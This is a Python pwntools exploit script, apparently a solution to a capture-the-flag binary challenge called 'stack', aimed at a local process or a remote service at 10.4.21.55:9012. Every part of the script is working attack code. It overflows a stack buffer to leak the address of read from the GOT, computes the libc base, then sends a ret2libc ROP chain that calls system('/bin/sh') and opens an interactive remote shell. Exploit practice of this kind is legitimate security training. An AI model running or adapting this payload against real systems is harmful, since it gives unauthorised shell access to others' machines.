#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
from sys import argv
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

def debug():
    addr = int(raw_input("DEBUG: "), 16)
    gdb.attach(io, "b *" + str(addr))

if argv[1][0] == "l":
    io = process("./stack")
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
else:
    io = remote("10.4.21.55", 9012)
    #  libc = ELF("./libc6-i386_2.23-0ubuntu9_amd64.so")
    libc = ELF("./libc6_2.23-0ubuntu9_i386.so")

elf = ELF("./stack")
gee_elf = elf.symbols["gee"]
write_elf = elf.symbols["write"]
puts_elf = elf.symbols["puts"]
puts_got = elf.got["puts"]
read_got = elf.got["read"]
read_libc = libc.symbols["read"]
#  print hex(read_libc)
system_libc = libc.symbols["system"]
sh_libc = next(libc.search("/bin/sh"))

for i in xrange(3):
    io.recvuntil("...........................................................*\n")
#Step 1: leak libc_base
payload = fit({0x88 + 0x4: [p32(write_elf), p32(gee_elf), p32(1), p32(read_got), p32(4)]})
#  payload = fit({0x88 + 0x4: [p32(puts_elf), p32(gee_elf), p32(puts_got)]})
io.sendlineafter("*...........................................................\n", payload)
#  pause()
#  sleep(30)
#  io.sendline(payload)
read_addr = u32(io.recv(4))
log.info("read_addr -> 0x%x" % read_addr)
libc_base = read_addr - read_libc
log.info("libc_base -> 0x%x" % libc_base)

#  Step 1: leak puts_got
payload = fit({0x88 + 0x4: [p32(write_elf), p32(gee_elf), p32(1), p32(puts_got), p32(4)]})
io.sendlineafter("*...........................................................\n", payload)
#  sleep(30)
#  io.sendline(payload)
puts_addr = u32(io.recv(4))
log.info("puts_addr -> 0x%x" % puts_addr)

#Step 2: rop
system_addr = libc_base + system_libc
sh_addr = libc_base + sh_libc
#  debug()
payload = fit({0x88 + 0x4: [p32(system_addr), p32(0xdeadbeef), p32(sh_addr)]})
io.sendlineafter("*...........................................................\n", payload)
#  sleep(30)
#  io.sendline(payload)

io.interactive()
io.close()
